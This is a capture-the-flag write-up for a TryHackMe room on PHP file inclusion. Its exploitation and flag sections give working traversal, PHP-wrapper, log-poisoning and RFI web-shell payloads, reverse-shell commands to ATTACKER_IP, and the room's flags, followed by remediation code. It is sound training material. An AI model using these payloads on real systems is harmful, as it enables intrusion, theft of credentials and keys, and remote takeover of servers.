# File Inclusion Vulnerabilities Writeup

**Room:** File Inclusion  
**Difficulty:** ⭐⭐⭐ (Medium)  
**Category:** Web Application Security  
**Platform:** TryHackMe

---

## 📋 Challenge Description

File inclusion vulnerabilities occur when applications use user-supplied input to include files without proper validation. This can lead to Local File Inclusion (LFI), Remote File Inclusion (RFI), and even Remote Code Execution (RCE).

---

## 🎯 Learning Objectives

- Understand file inclusion mechanisms
- Exploit Local File Inclusion (LFI)
- Exploit Remote File Inclusion (RFI)
- Achieve RCE through log poisoning
- Bypass input filters and protections

---

## 🔍 Reconnaissance

### Identify Vulnerable Parameters

**Common vulnerable parameters:**
```
?file=
?page=
?include=
?path=
?template=
?document=
```

**Test endpoint:**
```bash
http://MACHINE_IP/index.php?page=home.php
```

---

## 🕵️ Enumeration

### Basic LFI Testing

**Test simple path traversal:**
```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..%2F..%2F..%2Fetc%2Fpasswd
```

### Linux Sensitive Files

**Common targets:**
```bash
/etc/passwd              # User accounts
/etc/shadow              # Password hashes (requires root)
/etc/group               # Group information
/etc/hosts               # Host file
/etc/hostname            # System hostname
/var/log/apache2/access.log   # Apache logs
/var/log/nginx/access.log     # Nginx logs
/proc/self/environ       # Environment variables
/proc/version            # Kernel version
~/.bash_history          # Command history
~/.ssh/id_rsa            # SSH private key
```

### Windows Sensitive Files

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\inetpub\logs\LogFiles\W3SVC1\
```

---

## 💥 Exploitation

### Technique 1: Basic LFI

**Payload:**
```bash
http://MACHINE_IP/index.php?page=../../../../etc/passwd
```

**Response shows:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

### Technique 2: Bypassing Extensions

**Application appends .php:**
```php
// Vulnerable code
include($_GET['page'] . '.php');
```

**Bypass using null byte (PHP < 5.3.4):**
```
?page=../../../../etc/passwd%00
```

**Bypass using path truncation:**
```
?page=../../../../etc/passwd/././././.[...repeat many times...]
```

### Technique 3: PHP Wrappers

**php://filter - Read source code:**
```bash
?page=php://filter/convert.base64-encode/resource=index.php
```

**Decode the base64 output:**
```bash
echo "PD9waHAgLy8gY29kZSBoZXJl" | base64 -d
```

**php://input - Execute code:**
```bash
curl -X POST http://MACHINE_IP/index.php?page=php://input \
  --data "<?php system('whoami'); ?>"
```

**data:// - Execute inline code:**
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
```

### Technique 4: Log Poisoning (LFI to RCE)

**Step 1: Inject PHP code into logs via User-Agent:**
```bash
curl http://MACHINE_IP/ \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

**Step 2: Include the poisoned log file:**
```bash
http://MACHINE_IP/index.php?page=/var/log/apache2/access.log&cmd=whoami
```

**Step 3: Execute commands:**
```bash
# Get reverse shell
http://MACHINE_IP/index.php?page=/var/log/apache2/access.log&cmd=nc -e /bin/bash ATTACKER_IP 4444
```

### Technique 5: Remote File Inclusion (RFI)

**Verify RFI is possible:**
```bash
?page=http://attacker.com/test.txt
```

**Create malicious PHP file on attacker server:**
```php
<?php
// shell.php
system($_GET['cmd']);
?>
```

**Host the file:**
```bash
# On attacker machine
python3 -m http.server 80
```

**Execute via RFI:**
```bash
http://MACHINE_IP/index.php?page=http://ATTACKER_IP/shell.php&cmd=id
```

### Technique 6: PHP Session Files

**Find session file path:**
```bash
?page=/var/lib/php/sessions/sess_[session_id]
```

**Inject code into session:**
```php
# Set session variable with PHP code
<?php $_SESSION['data'] = '<?php system($_GET["cmd"]); ?>'; ?>
```

**Include session file:**
```bash
?page=/var/lib/php/sessions/sess_abc123&cmd=whoami
```

---

## 🔑 Flags

### User Flag
**Method:** LFI to read `/home/user/user.txt`

```bash
http://MACHINE_IP/index.php?page=../../../../home/user/user.txt
```

**Flag:** `THM{local_file_inclusion}`

### Root Flag
**Method:** Log poisoning to achieve RCE, then privilege escalation

**Step 1: Poison access log**
```bash
curl http://MACHINE_IP/ -H "User-Agent: <?php system(\$_GET['c']); ?>"
```

**Step 2: Get reverse shell**
```bash
# Setup listener
nc -lvnp 4444

# Trigger payload
http://MACHINE_IP/index.php?page=/var/log/apache2/access.log&c=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**Step 3: Privilege escalation**
```bash
# Found SUID binary
find / -perm -4000 2>/dev/null

# Exploited with GTFOBins
```

**Flag:** `THM{log_poisoning_rce}`

---

## 📚 Lessons Learned

### Key Concepts

1. **File Inclusion Basics**
   - LFI: Include files from local system
   - RFI: Include files from remote server
   - Both can lead to code execution

2. **Common Mistakes by Developers**
   - Trusting user input
   - Not validating file paths
   - Insufficient input sanitization
   - Improper use of include functions

3. **Attack Prerequisites**
   - User-controlled file path parameter
   - Vulnerable include function
   - Readable target files (LFI)
   - Remote file inclusion enabled (RFI)

### Defense Mechanisms

**Input Validation:**
```php
// Whitelist approach
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed_pages)) {
    include($page . '.php');
} else {
    include('error.php');
}
```

**Path Normalization:**
```php
$file = basename($_GET['page']);  // Remove directory components
$file = realpath($file);          // Resolve symbolic links

// Check if file is in allowed directory
if (strpos($file, '/var/www/allowed/') === 0) {
    include($file);
}
```

---

## 🛡️ Remediation

### Secure Code Practices

1. **Avoid Dynamic Includes**
```php
// Bad
include($_GET['page']);

// Good - Use mapping
$pages = [
    'home' => 'templates/home.php',
    'about' => 'templates/about.php'
];

$page = $_GET['page'] ?? 'home';
if (isset($pages[$page])) {
    include($pages[$page]);
}
```

2. **Disable Dangerous PHP Settings**
```ini
; php.ini
allow_url_fopen = Off
allow_url_include = Off
open_basedir = /var/www/html
```

3. **Use Whitelisting**
```php
function safe_include($page) {
    $whitelist = ['home', 'about', 'contact'];
    $page = basename($page, '.php');
    
    if (in_array($page, $whitelist)) {
        include("pages/{$page}.php");
        return true;
    }
    return false;
}
```

### Web Server Configuration

**Apache (.htaccess):**
```apache
# Prevent access to sensitive files
<FilesMatch "\.(log|ini|conf)$">
    Order allow,deny
    Deny from all
</FilesMatch>
```

**Nginx:**
```nginx
location ~ \.(log|ini|conf)$ {
    deny all;
}
```

---

## 🔧 Tools Used

- **Burp Suite** - Request manipulation
- **curl** - Command-line testing
- **Python HTTP Server** - Hosting malicious files
- **Netcat** - Reverse shell listener

---

## 📖 References

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PHP Wrapper Documentation](https://www.php.net/manual/en/wrappers.php)
- [File Inclusion Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---

**Date Completed:** November 2025  
**Time Taken:** 3 hours  
**Difficulty Rating:** 8/10

---

*Educational purposes only. Always obtain proper authorization.*
